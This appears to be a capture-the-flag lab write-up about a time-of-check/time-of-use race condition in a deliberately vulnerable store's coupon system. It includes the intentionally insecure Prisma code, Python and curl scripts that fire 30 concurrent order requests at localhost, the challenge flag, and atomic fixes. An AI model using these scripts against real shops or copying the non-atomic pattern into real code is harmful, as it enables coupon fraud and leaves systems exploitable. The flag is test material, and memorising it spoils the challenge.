# Race Condition — Coupon Abuse (TOCTOU)

## Overview

The OopsSec Store includes a promotional coupon system that lets shoppers enter a discount code at checkout. A marketing banner on the homepage advertises the code `FLASHSALE`, which grants 50% off any order. The code is intended to be single-use (`maxUses = 1`), but the backend implementation contains a Time-of-Check Time-of-Use (TOCTOU) race condition that allows the limit to be bypassed.

## Why This Is Dangerous

### Time-of-Check Time-of-Use (TOCTOU)

A TOCTOU vulnerability arises when a program checks a condition and then acts on it, but the state can change between the check and the action. In multi-threaded or concurrent environments, another request can slip in during that gap.

In e-commerce, this pattern regularly affects:

- **Coupon / promo codes** — a single-use code gets redeemed many times before the counter is updated
- **Gift cards** — concurrent redemptions drain more balance than allowed
- **Flash-sale inventory** — items oversold because stock checks and decrements are not atomic
- **Referral credits** — the same referral bonus claimed multiple times simultaneously

Real-world HackerOne report that exploited this class of vulnerability:

- [HackerOne #759247](https://hackerone.com/reports/759247) — Race condition on coupon redemption allowing unlimited use of a single-use coupon

### What This Means

Any check-then-act sequence on shared state must be atomic. If two requests both pass the `usedCount < maxUses` check before either of them increments the counter, they both proceed as though the coupon is valid — even if only one should have been allowed.

## The Vulnerability

`POST /api/coupon/apply` is a **preview-only** endpoint — it validates the coupon and returns the discounted total, but writes nothing to the database. The coupon is consumed only when the order is placed.

`POST /api/orders` performs the two vulnerable operations in sequence:

```typescript
// Step 1 — CHECK: read the current counter
const coupon = await prisma.coupon.findUnique({ where: { code } });

if (coupon.usedCount < coupon.maxUses) {
  // ← window of vulnerability: other requests read the same usedCount = 0

  // Step 2 — ACT: increment the counter (separate DB call)
  const updated = await prisma.coupon.update({
    where: { code: coupon.code },
    data: { usedCount: { increment: 1 } },
  });

  if (updated.usedCount > coupon.maxUses) {
    // race detected — flag returned here
  }
}
```

Because steps 1 and 2 are separate database round-trips with no locking or transaction, many concurrent requests can pass the check before any of them completes the increment.

## Root Cause

The vulnerability is in [app/api/orders/route.ts](app/api/orders/route.ts). The two Prisma calls — `findUnique` and `update` — are intentionally **not** wrapped in a `prisma.$transaction()` and do not use an atomic conditional update. This is the non-atomic, vulnerable pattern.

## Exploitation

### How to Retrieve the Flag

The flag `OSS{r4c3_c0nd1t10n_c0up0n_4bus3}` is returned in the `POST /api/orders` response when the race is triggered — i.e., when `usedCount` after the increment exceeds `maxUses`.

1. Browse the homepage and notice the `FLASHSALE` banner advertising 50% off.
2. Add any item to your cart and go to `/checkout`.
3. Expand "Have a promo code?", enter `FLASHSALE`, and click **Apply** — the total updates to 50% off. The coupon is not consumed yet; you can remove and re-enter it freely.
4. Click **Complete Payment** — the order is placed and the coupon is consumed (`usedCount` becomes 1).
5. Try to place another order with `FLASHSALE` — the discount is silently ignored this time, the coupon is exhausted.
6. Re-seed the database to reset `usedCount` to 0: `npm run db:seed`.
7. Send 30 concurrent `POST /api/orders` requests, all with the same coupon code, before any single request has had time to increment the counter:

```python
import asyncio, httpx

# Replace with your actual values
TOKEN = "<your-authToken>"
CART_TOTAL = 5.49           # e.g. one Artisan Sourdough Bread — set to your actual cart total
DISCOUNTED  = round(CART_TOTAL * 0.5, 2)

async def place_order(client, i):
    r = await client.post(
        "http://localhost:3000/api/orders",
        json={"total": DISCOUNTED, "couponCode": "FLASHSALE"},
        cookies={"authToken": TOKEN},
    )
    print(i, r.status_code, r.json())

async def main():
    async with httpx.AsyncClient(timeout=10) as client:
        await asyncio.gather(*[place_order(client, i) for i in range(30)])

asyncio.run(main())
```

```bash
# Or with curl --parallel
# Replace 2.75 with half of your actual cart total (CART_TOTAL * 0.5)
TOKEN="<your-authToken>"
seq 30 | xargs -P30 -I{} curl -s \
  -X POST http://localhost:3000/api/orders \
  -H "Content-Type: application/json" \
  -H "Cookie: authToken=$TOKEN" \
  -d '{"total":2.75,"couponCode":"FLASHSALE"}'
```

Several responses will contain the flag:

```json
{
  "id": "ORD-007",
  "total": 2.75,
  "status": "PENDING",
  "flag": "OSS{r4c3_c0nd1t10n_c0up0n_4bus3}"
}
```

## Secure Implementation

The fix requires making the check and the increment **atomic** inside `app/api/orders/route.ts`. Prisma supports two approaches:

### Option A — Atomic conditional update (preferred)

```typescript
const updated = await prisma.coupon.updateMany({
  where: {
    code: couponCode.toUpperCase(),
    usedCount: { lt: maxUses },
  },
  data: { usedCount: { increment: 1 } },
});

if (updated.count === 0) {
  // coupon exhausted — skip the discount
}
```

`updateMany` with a `where` clause translates to a single `UPDATE … WHERE` SQL statement. The check and the increment happen atomically — only one request can win.

### Option B — Explicit transaction

```typescript
await prisma.$transaction(async (tx) => {
  const coupon = await tx.coupon.findUnique({ where: { code } });

  if (!coupon || coupon.usedCount >= coupon.maxUses) {
    throw new Error("Coupon exhausted");
  }

  return tx.coupon.update({
    where: { code },
    data: { usedCount: { increment: 1 } },
  });
});
```

Note that a transaction alone is not sufficient with SQLite's default isolation level; the atomic `updateMany` approach is more reliable across databases.

## References

- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization (Race Condition)](https://cwe.mitre.org/data/definitions/362.html)
- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [HackerOne #759247 — Race condition on coupon redemption](https://hackerone.com/reports/759247)
